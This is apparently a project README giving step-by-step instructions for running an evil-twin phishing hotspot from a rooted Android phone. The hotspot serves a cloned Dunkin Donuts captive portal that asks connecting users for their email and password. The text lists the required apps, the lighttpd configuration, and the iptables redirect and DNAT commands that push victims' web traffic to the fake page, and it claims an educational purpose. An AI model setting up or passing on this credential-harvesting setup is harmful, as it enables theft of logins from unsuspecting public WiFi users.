## Fake Captive Portal Using Android Phone

This project is about preparing a phishing attack on a certain captive portal. In my case, I used a cloned Dunkin Donuts portal.

We will learn how setup a Fake Captive Portal on a Web Server hosted by a rooted Android device.
By creating an open hotspot with the same name as the open AP, a user might accidentally connect to your hotspot instead (especially if your WiFi signal is better). He will be immeditately redirected to your cloned but modified captive portal page, where he is required to insert sensitive information such as his email and password in order to access the WiFi.

**This project is clearly for educational purposes only.** The goal is to learn about the vulnerabilites of a captive portal, and how dangerous it is to have an open AP that can be easily suceptible to malicous attacks such as phishing, man in the middle, Rogue AP and Evil Twin.

### Prerequisites

- **Rooted Android Phone**
- **SIM card with a Mobile Data Plan**
- **Web Server App** (*Bit Web Server* or *KSWEB*)
- **Root Explorer**
- **[iptables2](https://www.apkmonk.com/app/jp.ymatsumoto.iptables2/)** **OR** **[Android Debug Bridge (adb)](https://dl.google.com/android/repository/platform-tools-latest-windows.zip)**

If you want to change the default captive portal page, you can access the page and save everything as .html using the Firefox extension [SingleFile](https://addons.mozilla.org/en-US/firefox/addon/single-file/)

### Installation

1. First and foremost, you need to root your Android Phone in order to execute the `iptables` commands. 
You can learn more about rooting [here](https://www.androidcentral.com/root)

2. Next, install a Web Server App on your phone. I highly recommend using **Bit Web Server** or **KSWEB**.
Note that **Bit Web Server** does not support Android 8 or higher, unlike **KSWEB**.

3. Configure and start a hostpot

### Configuration

1. Open the Web Server App and write down the server's IP Address and port (usually, it's 8877)

2. Modifiy the **SERVER_IP_ADDRESS** in the following files accordingly:

&nbsp;&nbsp;&nbsp;&nbsp; * `\404.php`
&nbsp;&nbsp;&nbsp;&nbsp; * `\redirect.sh`

3. Configure the `lighttpd.conf` file using the Web Server App or Root Explorer:

&nbsp;&nbsp;&nbsp;&nbsp; * `server.document-root = "/sdcard/www"`
&nbsp;&nbsp;&nbsp;&nbsp; * `server.dir-listing = "disable"` OR `dir-listing.activate = "disable"`
&nbsp;&nbsp;&nbsp;&nbsp; * `server.error-handler-404 = "/404.php"`

4. Using Root Explorer, you can copy all the files to your Web Server Root directory:

&nbsp;&nbsp;&nbsp;&nbsp; * `404.php` to `/sdcard/www`
&nbsp;&nbsp;&nbsp;&nbsp; * `splash` folder to `/sdcard/www`

### Changing the iptables to redirect the user

#### METHOD 1 - Using the redirect script

You can simply copy the `redirect.sh` script to your Android Phone and execute it using **iptables2** or **adb**.

1. If you're using **adb**, connect your device to the computer and open a terminal:

        `adb devices`

2. Open a remote shell:

        `adb shell`

3. Elevate the privileges

        `su - `

4. Now navigate to your `redirect.sh` script and execute it:

        `./redirect.sh`

5. To check the current iptables rules, you can execute:

        `iptables -L`

        `iptables -t nat -L`

#### METHOD 2 - Using iptables2

You can use **iptables2** to insert the rules one by one

1. Redirect the port 8877 of your Web server to the HTTP port 80

        `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8877`

2. Enable the DNS packets since the user will try to access the internet using a domain name, so he will be redirected to your captive portal
        ```
        iptables -A FORWARD -p udp --dport 53 -j ACCEPT

        iptables -A FORWARD -p udp --sport 53 -j ACCEPT
        ```
3. To redirect the user accessing the port 80 to your Web server

        `iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination SERVER_IP_ADDRESS`

4. Finally, the default iptable rule is to drop other packets

        `iptables -P FORWARD DROP`

